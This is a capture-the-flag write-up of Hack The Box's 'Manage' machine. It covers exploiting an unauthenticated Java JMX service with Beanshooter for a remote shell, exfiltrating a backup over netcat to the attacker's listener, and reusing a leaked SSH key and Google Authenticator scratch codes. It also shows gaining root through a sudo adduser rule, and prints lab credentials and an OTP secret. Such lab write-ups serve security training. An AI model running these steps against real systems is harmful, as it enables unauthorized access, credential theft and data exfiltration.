<h1 style="color:blue;">Manage Machine</h1>

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Linux

<img width="1570" height="197" alt="image" src="https://github.com/user-attachments/assets/12bc9a00-5667-4031-a606-9aac751ecd79" />


## Overview

Manage is a Linux machine that combines Java RMI enumeration, Tomcat JMX exploitation, SSH authentication protected with Google Authenticator, and a privilege escalation through a misconfigured sudo rule.

## Tools Used

- Nmap
- Metasploit
- Beanshooter
- Netcat
- SSH
- Tar

# Enumeration

## 1. Initial Recon

I started by scanning the target with Nmap.

```
nmap -Pn manage.htb
```

Result:

```
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
```

Before browsing the website, don't forget to add the machine ip to /etc/hosts.

```
echo "<TARGET_IP> manage.htb" | sudo tee -a /etc/hosts
```

## 2. Web Enumeration

Browsing to:

```
http://manage.htb:8080/
```

revealed an Apache Tomcat instance.

The website showed the version:

```
Apache Tomcat/10.1.19
```

I searched for public exploits against this version, but nothing useful was applicable.


## 3. Investigating Port 2222

Port 2222 looked more interesting.

Running a version scan:

```bash
nmap -Pn manage.htb -p2222 -sV
```

returned:

```
2222/tcp open  java-rmi Java RMI
```

##### What is Java RMI?

Java Remote Method Invocation (RMI) allows Java applications running in different JVMs to invoke methods on remote Java objects.

Since RMI often exposes management interfaces, it's a common attack surface for Java applications.

Reference:

[The article](https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/#references)


## 4. Beanshooter Enumeration

Next, I used Beanshooter, a tool designed to enumerate and exploit Java JMX services.


```
git clone https://github.com/qtc-de/beanshooter

cd beanshooter

mvn package
```

Enumeration:

```
cd ../target
java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum manage.htb 2222
```

Result:

```
 Checking for unauthorized access:
[+]
[+]     - Remote MBean server does not require authentication.
[+]       Vulnerability Status: Vulnerable

...
...
Tomcat Users

Username: manager
Password: fhErvo2r9wuTEYiYgt

Username: admin
Password: onyRPCkaG4iX72BrRtKgbszd
```

The JMX service is accessible and does not require authentication.

The Standard action deploys a malicious MBean that achieves remote code execution.



## 5. Deploying TonkaBean

Deploy TonkaBean:

```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard manage.htb 2222 tonka
```

Open an interactive shell:

```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell manage.htb 2222
```

Yessss, I obtained command execution on the target.


## 6. User Flag

Locate the user flag.

```bash
find / -name "user.txt" 2>/dev/null
```

Result:

```
/opt/tomcat/user.txt
```

Read it:

```bash
cat /opt/tomcat/user.txt
```

Voilaaa!

The user flag was retrieved.

## 7. Lateral Movement

Listing /home revealed two users:

```
karl
useradmin
```

Inside useradmin, I found:

```
backups/
```

Listing its contents:

```
backup.tar.gz
```

## 8. Exfiltrating the Backup

On my machine:

```
nc -lnvp 4444 > backup.tar.gz
```

On the target:

```
nc <YOUR_tun0_IP> 4444 < backup.tar.gz
```

Extract it:

```
tar -xvzf backup.tar.gz
```

Contents:

```
.ssh/id_ed25519
.google_authenticator
...
...
```


## 9. Recovering the SSH Key

The backup contained the user's private key:

```
.ssh/id_ed25519
```

I attempted to authenticate:

```bash
ssh -i id_ed25519 useradmin@manage.htb
```

However, SSH requested a verification code.


## 10. Bypassing Google Authenticator

The backup also contained:

```
.google_authenticator
```

Viewing it:

```bash
cat .google_authenticator
```

Output:

```
CLSSSMHYGLENX5HAIFBQ6L35UM

" RATE_LIMIT ...
" WINDOW_SIZE ...
" TOTP_AUTH

99852083
20312647
73235136
...
```

The file contains the OTP secret.

After entering anyone of them, SSH login succeeded.


## 11. Privilege Escalation

Running:

```bash
sudo -l
```

returned:

```
(ALL : ALL) NOPASSWD:
/usr/sbin/adduser ^[a-zA-Z0-9]+$
```

This means useradmin can execute adduser as root without a password.


## 12. Creating a New Administrative User

First, I checked existing users:

```
cat /etc/passwd | grep admin
```

There wasn't a normal administrator account.

So I created one:

```
sudo /usr/sbin/adduser admin
```

I chose a password (e.g., test) and accepted the defaults.

Then I switched to the new account:

```
su admin
```

## 13. Root Access

The newly created user automatically belongs to the sudo group.

Therefore:

```
sudo su
```

gave me a root shell.

Verify:

```bash
id
```

```
uid=0(root)
```


## 14. Root Flag

Locate the flag:

```bash
find / -name root.txt 2>/dev/null
```

Result:

```
/root/root.txt
```

Read it:

```bash
cat /root/root.txt
```

Voilaaa!

The root flag was successfully retrieved.

#

[The challenge link](https://app.hackthebox.com/machines/Manage?sort_by=created_at&sort_type=desc)

See you in the next writeup!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
